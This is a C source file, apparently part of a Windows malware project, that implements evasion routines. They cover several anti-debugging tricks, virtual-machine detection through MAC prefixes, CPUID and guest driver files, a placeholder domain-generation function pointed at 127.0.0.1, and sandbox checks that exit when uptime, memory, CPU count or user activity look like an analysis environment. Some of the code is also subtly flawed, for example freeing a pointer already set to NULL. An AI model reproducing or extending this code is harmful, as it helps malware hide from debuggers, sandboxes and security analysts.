#include "malware.h"
#include <iphlpapi.h>
#include <time.h>
#include <Winuser.h>

#pragma comment(lib, "iphlpapi.lib")  // Link IP Helper library
#pragma comment(lib, "advapi32.lib")  // Link Advanced API library

// Execute CPUID instruction to get processor information
static void cpuid(int cpuInfo[4], int function_id) {
    #if defined(__GNUC__)  // GCC/Clang inline assembly
    __asm__ volatile (
        "cpuid"
        : "=a"(cpuInfo[0]), "=b"(cpuInfo[1]), "=c"(cpuInfo[2]), "=d"(cpuInfo[3])
        : "a"(function_id)
    );
    #else  // MSVC intrinsic
    __cpuid(cpuInfo, function_id);
    #endif
}

// Check if debugger is attached using multiple techniques
BOOL IsDebugged() {
    // 1. Standard debugger presence check
    if (IsDebuggerPresent()) 
        return TRUE;
    
    // 2. Check heap flags (anti-debugging technique)
    DWORD flHeaps = *(DWORD*)(__readfsdword(0x30) + 0x18);
    if (*(BYTE*)(flHeaps + 0x10) & 0x60) 
        return TRUE;
    
    // 3. Timing check - debuggers often slow down execution
    DWORD start = GetTickCount();
    Sleep(1000);
    if (GetTickCount() - start < 900)
        return TRUE;
    
    // 4. Check hardware breakpoints
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            return TRUE;
        }
    }
    
    // 5. RDTSC timing check (high-resolution timer)
    ULARGE_INTEGER tsc1, tsc2;
    __asm__ __volatile__ ("rdtsc" : "=a"(tsc1.LowPart), "=d"(tsc1.HighPart));
    Sleep(500);
    __asm__ __volatile__ ("rdtsc" : "=a"(tsc2.LowPart), "=d"(tsc2.HighPart));
    
    // If elapsed cycles are too low, likely in debugger
    if ((tsc2.QuadPart - tsc1.QuadPart) < 1000000) {
        return TRUE;
    }
    
    return FALSE;  // No debugger detected
}

// Check if running in virtual machine environment
BOOL IsVM() {
    PIP_ADAPTER_INFO adapter;
    ULONG adapterSize = 0;
    
    // Check MAC addresses of network adapters for VM signatures
    if (GetAdaptersInfo(NULL, &adapterSize) == ERROR_BUFFER_OVERFLOW) {
        adapter = (PIP_ADAPTER_INFO)malloc(adapterSize);
        if (GetAdaptersInfo(adapter, &adapterSize) == ERROR_SUCCESS) {
            while (adapter) {
                if (adapter->AddressLength >= 6) {
                    BYTE* mac = adapter->Address;
                    // VMware: 00:05:69, 00:0C:29, 00:1C:14
                    // VirtualBox: 08:00:27
                    if (mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) return TRUE;
                    if (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) return TRUE;
                    if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x14) return TRUE;
                    if (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27) return TRUE;
                }
                adapter = adapter->Next;
            }
        }
        free(adapter);
    }
    
    // CPUID-based VM detection
    int cpuInfo[4];
    cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {  // Hypervisor bit
        return TRUE;
    }
    
    // Check for VM-specific files
    if (GetFileAttributesA("C:\\Windows\\System32\\vmGuestLib.dll") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA("C:\\Windows\\System32\\vboxmrxnp.dll") != INVALID_FILE_ATTRIBUTES) {
        return TRUE;
    }
    
    return FALSE;  // No VM detected
}

// Domain Generation Algorithm (DGA) - currently using fixed domain
void GenerateDomain(char* domain, size_t max_len) {
    const char* fixed_domain = "127.0.0.1";  // Hardcoded for testing
    strncpy(domain, fixed_domain, max_len);
    domain[max_len-1] = '\0';
    printf("[DGA] Using fixed domain: %s\n", domain);
}

// Check for user activity to detect sandbox environments
BOOL IsRealUser() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    
    if (!GetLastInputInfo(&lii)) {
        printf("[UserCheck] GetLastInputInfo failed: %d\n", GetLastError());
        return FALSE;
    }
    
    // Calculate idle time (milliseconds since last input)
    DWORD idleTime = GetTickCount() - lii.dwTime;
    BOOL result = (idleTime < 300000);  // 5 minutes threshold
    
    // Debug output
    printf("[UserCheck] Idle time: %dms -> %s\n", 
           idleTime, 
           result ? "Real user" : "Sandbox detected");
    
    return result;
}

// Perform sandbox evasion checks
void AddSandboxEvasion() {
    // 1. Uptime Check (minimum 5 minutes)
    if (GetTickCount() < 5 * 60 * 1000) {
        printf("[Sandbox] Uptime too low - exiting!\n");
        ExitProcess(0);
    }
    
    // 2. Memory Check (minimum 2GB RAM)
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        printf("[Sandbox] Memory too low - exiting!\n");
        ExitProcess(0);
    }
    
    // 3. CPU Core Check (minimum 2 cores)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        printf("[Sandbox] Not enough CPUs - exiting!\n");
        ExitProcess(0);
    }
    
    // 4. User Interaction Check (activity within 5 minutes)
    if (!IsRealUser()) {
        printf("[Sandbox] No user interaction detected - exiting!\n");
        ExitProcess(0);
    }
}